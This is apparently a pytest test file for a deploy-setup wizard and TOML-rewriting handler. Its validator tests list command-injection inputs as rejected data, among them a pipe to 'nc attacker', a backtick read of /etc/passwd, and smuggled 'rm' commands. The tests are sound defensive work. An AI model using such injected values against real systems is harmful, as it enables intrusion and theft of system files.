"""Tests for /setup-deploy wizard + handler + plugin registration (Plan 05-05).

Covers:

- Wizard happy-path (vercel / custom) via monkeypatched questionary.
- Validator rejection of shell metachars in project slug + custom_deploy_cmd
  (T-05-05-01 + T-05-05-02 adversarial inputs / D-15).
- KeyboardInterrupt on user Ctrl-C.
- Handler: atomic write of a new [deploy] block; all other TOML blocks
  preserved (T-05-05-03).
- Handler: idempotent re-run — confirm=yes replaces block; confirm=no leaves
  file byte-identical.
- Handler: DeployConfig pydantic validation rejects bad provider before
  write (T-05-05-05).
- SkillDispatcher: role-gated to sre (T-05-05-04).
- GstackSprintPlugin: /setup-deploy now registered with roles={'sre'}.
"""

from __future__ import annotations

import re
from pathlib import Path
from types import SimpleNamespace
from typing import Any, List

import pytest

# ---------------------------------------------------------------------------
# Minimal gstack.toml fixture used across handler tests.
# Shaped to resemble the real clawteam/templates/gstack.toml: [template] root
# with nested [[template.agents]] + [template.review] + [[template.review.rules]]
# — the rewrite logic MUST preserve all of them.
# ---------------------------------------------------------------------------

_MINIMAL_GSTACK_TOML = """\
[template]
name = "gstack"
description = "test template"
command = ["claude"]
backend = "tmux"
leader_role = "ceo"

[template.leader]
name = "ceo"
type = "strategic-leader"
role = "ceo"
prompt_file = "gstack/prompts/ceo.md"

[[template.agents]]
name = "sre"
type = "site-reliability-engineer"
role = "sre"
prompt_file = "gstack/prompts/sre.md"

[template.review]
sycophancy_threshold = 0.9

[[template.review.rules]]
pattern = "src/components/**/*.tsx"
reviewers = ["designer"]
signal = "ui"
"""


# ---------------------------------------------------------------------------
# Questionary mocks — chain of answers consumed in order.
# ---------------------------------------------------------------------------


class _MockAsk:
    """Mimic questionary's fluent .ask() API."""

    def __init__(self, value: Any) -> None:
        self._value = value

    def ask(self) -> Any:
        return self._value


class _MockQuestionary:
    """Feed pre-canned answers to select/text/confirm in call order."""

    def __init__(
        self,
        selects: List[Any] | None = None,
        texts: List[Any] | None = None,
        confirms: List[Any] | None = None,
    ) -> None:
        self._selects = list(selects or [])
        self._texts = list(texts or [])
        self._confirms = list(confirms or [])
        self._text_validators: List[Any] = []

    def select(self, *_a, **_k) -> _MockAsk:
        if not self._selects:
            raise AssertionError("no more mock select answers")
        return _MockAsk(self._selects.pop(0))

    def text(self, *_a, **kw) -> _MockAsk:
        if not self._texts:
            raise AssertionError("no more mock text answers")
        # Capture the validate lambda so tests can introspect it.
        if "validate" in kw:
            self._text_validators.append(kw["validate"])
        return _MockAsk(self._texts.pop(0))

    def confirm(self, *_a, **_k) -> _MockAsk:
        if not self._confirms:
            raise AssertionError("no more mock confirm answers")
        return _MockAsk(self._confirms.pop(0))


def _patch_questionary(monkeypatch, mock: _MockQuestionary) -> None:
    """Swap the wizard module's _load_questionary to return the mock."""
    import clawteam.templates.gstack.skills.setup_deploy.wizard as wz

    monkeypatch.setattr(wz, "_load_questionary", lambda: mock)


# ---------------------------------------------------------------------------
# 1. Wizard happy-path: vercel
# ---------------------------------------------------------------------------


def test_wizard_collects_vercel(monkeypatch):
    from clawteam.templates.gstack.skills.setup_deploy.wizard import run_wizard

    mock = _MockQuestionary(selects=["vercel"], texts=["my-app"])
    _patch_questionary(monkeypatch, mock)

    result = run_wizard()
    assert result == {
        "provider": "vercel",
        "project": "my-app",
        "custom_deploy_cmd": "",
    }


# ---------------------------------------------------------------------------
# 2. Wizard happy-path: custom (collects extra custom_deploy_cmd prompt)
# ---------------------------------------------------------------------------


def test_wizard_collects_custom(monkeypatch):
    from clawteam.templates.gstack.skills.setup_deploy.wizard import run_wizard

    mock = _MockQuestionary(
        selects=["custom"], texts=["my-app", "./deploy.sh"]
    )
    _patch_questionary(monkeypatch, mock)

    result = run_wizard()
    assert result == {
        "provider": "custom",
        "project": "my-app",
        "custom_deploy_cmd": "./deploy.sh",
    }


# ---------------------------------------------------------------------------
# 3. Validator: project slug rejects shell metachars (T-05-05-01).
# ---------------------------------------------------------------------------


def test_wizard_rejects_bad_project_slug():
    from clawteam.templates.gstack.skills.setup_deploy.wizard import (
        validate_project_slug,
    )

    assert validate_project_slug("my-app") is True
    assert validate_project_slug("my_app_1") is True
    assert validate_project_slug("; rm") is False
    assert validate_project_slug("a b") is False
    assert validate_project_slug("") is False
    assert validate_project_slug(None) is False
    # Adversarial: shell metachars
    for bad in ("foo;rm", "foo|bar", "foo&bar", "foo`x`", "foo$x", "foo/bar"):
        assert validate_project_slug(bad) is False, bad


# ---------------------------------------------------------------------------
# 4. Validator: custom_deploy_cmd rejects shell metachars (T-05-05-02).
# ---------------------------------------------------------------------------


def test_wizard_rejects_shell_metachars_in_custom_cmd():
    from clawteam.templates.gstack.skills.setup_deploy.wizard import (
        validate_custom_cmd,
    )

    assert validate_custom_cmd("./deploy.sh") is True
    assert validate_custom_cmd("npm run deploy") is True
    assert validate_custom_cmd("") is True
    assert validate_custom_cmd(None) is True

    # Adversarial: every shell metachar denied.
    for bad in (
        "./deploy.sh; rm",
        "./deploy.sh | nc attacker",
        "./deploy.sh && rm",
        "./deploy.sh `cat /etc/passwd`",
        "./deploy.sh $IFS",
        "./deploy.sh > /tmp/out",
        "./deploy.sh < /etc/passwd",
        "./deploy.sh\\nrm",
        "./deploy.sh\nrm",
    ):
        assert validate_custom_cmd(bad) is False, bad


# ---------------------------------------------------------------------------
# 5. Wizard: Ctrl-C surfaces as KeyboardInterrupt.
# ---------------------------------------------------------------------------


def test_wizard_keyboard_interrupt(monkeypatch):
    from clawteam.templates.gstack.skills.setup_deploy.wizard import run_wizard

    # questionary returns None on Ctrl-C → run_wizard must re-raise.
    mock = _MockQuestionary(selects=[None])
    _patch_questionary(monkeypatch, mock)

    with pytest.raises(KeyboardInterrupt):
        run_wizard()


# ---------------------------------------------------------------------------
# 6. Handler: writes new [deploy] block; all existing blocks preserved.
# ---------------------------------------------------------------------------


def _patch_wizard_result(monkeypatch, result: dict[str, Any]) -> None:
    import clawteam.templates.gstack.skills.setup_deploy.handler as hd

    monkeypatch.setattr(hd, "run_wizard", lambda: result)


def _write_minimal_toml(tmp_path: Path) -> Path:
    target = tmp_path / "gstack.toml"
    target.write_text(_MINIMAL_GSTACK_TOML)
    return target


def test_handler_writes_new_block(tmp_path, monkeypatch):
    from clawteam.templates.gstack.skills.setup_deploy.handler import (
        setup_deploy_handler,
    )

    toml_path = _write_minimal_toml(tmp_path)
    _patch_wizard_result(
        monkeypatch,
        {"provider": "vercel", "project": "app", "custom_deploy_cmd": ""},
    )
    ctx = SimpleNamespace(gstack_toml_path=toml_path)

    result = setup_deploy_handler(
        ctx, role="sre", args={"_skip_confirm": True}
    )

    assert result["status"] == "written"
    assert result["provider"] == "vercel"
    content = toml_path.read_text()
    # [deploy] block present with proper values
    assert "[deploy]" in content
    assert 'provider = "vercel"' in content
    assert 'project = "app"' in content
    # Pre-existing blocks preserved verbatim
    assert "[template]" in content
    assert '[[template.agents]]' in content
    assert "[template.review]" in content
    assert '[[template.review.rules]]' in content
    assert 'pattern = "src/components/**/*.tsx"' in content
    # Parses as TOML
    import tomllib
    parsed = tomllib.loads(content)
    assert parsed["deploy"]["provider"] == "vercel"
    assert parsed["deploy"]["project"] == "app"
    assert parsed["template"]["name"] == "gstack"


# ---------------------------------------------------------------------------
# 7. Handler: re-run with existing [deploy] block — confirm=yes replaces
#    the block (ONE [deploy] header in final file).
# ---------------------------------------------------------------------------


def test_handler_idempotent_rerun_yes_overwrite(tmp_path, monkeypatch):
    from clawteam.templates.gstack.skills.setup_deploy.handler import (
        setup_deploy_handler,
    )

    target = tmp_path / "gstack.toml"
    target.write_text(
        _MINIMAL_GSTACK_TOML
        + '\n[deploy]\nprovider = "netlify"\nproject = "old-app"\n'
    )

    _patch_wizard_result(
        monkeypatch,
        {"provider": "vercel", "project": "new-app", "custom_deploy_cmd": ""},
    )

    # Patch confirm_overwrite → yes
    import clawteam.templates.gstack.skills.setup_deploy.handler as hd

    monkeypatch.setattr(hd, "confirm_overwrite", lambda: True)

    ctx = SimpleNamespace(gstack_toml_path=target)
    result = setup_deploy_handler(ctx, role="sre", args={})

    assert result["status"] == "written"
    content = target.read_text()
    # Exactly ONE [deploy] block
    assert content.count("[deploy]") == 1
    assert 'provider = "vercel"' in content
    assert 'project = "new-app"' in content
    # Old values gone
    assert "netlify" not in content
    assert "old-app" not in content
    # Other blocks preserved
    assert "[template.review]" in content


# ---------------------------------------------------------------------------
# 8. Handler: re-run + confirm=no → file byte-identical.
# ---------------------------------------------------------------------------


def test_handler_idempotent_rerun_no_keep(tmp_path, monkeypatch):
    from clawteam.templates.gstack.skills.setup_deploy.handler import (
        setup_deploy_handler,
    )

    target = tmp_path / "gstack.toml"
    original = (
        _MINIMAL_GSTACK_TOML
        + '\n[deploy]\nprovider = "netlify"\nproject = "keeper"\n'
    )
    target.write_text(original)

    # Wizard should not even be invoked, but give it something sensible just in case.
    _patch_wizard_result(
        monkeypatch,
        {"provider": "vercel", "project": "new", "custom_deploy_cmd": ""},
    )

    import clawteam.templates.gstack.skills.setup_deploy.handler as hd

    monkeypatch.setattr(hd, "confirm_overwrite", lambda: False)

    ctx = SimpleNamespace(gstack_toml_path=target)
    result = setup_deploy_handler(ctx, role="sre", args={})

    assert result["status"] == "skipped"
    # File bytes unchanged
    assert target.read_text() == original


# ---------------------------------------------------------------------------
# 9. SkillDispatcher: role-gated to sre (T-05-05-04).
# ---------------------------------------------------------------------------


def test_handler_role_gated():
    from clawteam.plugins.gstack_sprint_plugin import GstackSprintPlugin
    from clawteam.plugins.skill_dispatcher import SkillDispatcher
    from clawteam.plugins.skill_errors import SkillNotPermitted

    plugin = GstackSprintPlugin()
    regs = {reg.name: reg for reg in plugin.contribute_skills()}
    assert "/setup-deploy" in regs
    dispatcher = SkillDispatcher(regs)

    with pytest.raises(SkillNotPermitted):
        dispatcher.dispatch(
            SimpleNamespace(),
            skill_name="/setup-deploy",
            role="engineer",
            args={},
        )


# ---------------------------------------------------------------------------
# 10. Handler: DeployConfig pydantic rejects bad provider BEFORE writing.
# ---------------------------------------------------------------------------


def test_handler_validates_via_deployconfig(tmp_path, monkeypatch):
    from pydantic import ValidationError

    from clawteam.templates.gstack.skills.setup_deploy.handler import (
        setup_deploy_handler,
    )

    target = _write_minimal_toml(tmp_path)
    original = target.read_text()

    # "aws" is not in the Literal enum — pydantic should reject.
    _patch_wizard_result(
        monkeypatch,
        {"provider": "aws", "project": "x", "custom_deploy_cmd": ""},
    )

    ctx = SimpleNamespace(gstack_toml_path=target)
    with pytest.raises(ValidationError):
        setup_deploy_handler(ctx, role="sre", args={"_skip_confirm": True})

    # File untouched
    assert target.read_text() == original


# ---------------------------------------------------------------------------
# 11. Plugin registration: GstackSprintPlugin.contribute_skills() now lists
#     /setup-deploy with roles=frozenset({'sre'}).
# ---------------------------------------------------------------------------


def test_handler_registered_in_plugin():
    from clawteam.plugins.gstack_sprint_plugin import GstackSprintPlugin

    plugin = GstackSprintPlugin()
    regs = {reg.name: reg for reg in plugin.contribute_skills()}
    assert "/setup-deploy" in regs
    reg = regs["/setup-deploy"]
    assert reg.roles == frozenset({"sre"})
    # Handler is callable (not just a placeholder).
    assert callable(reg.handler)
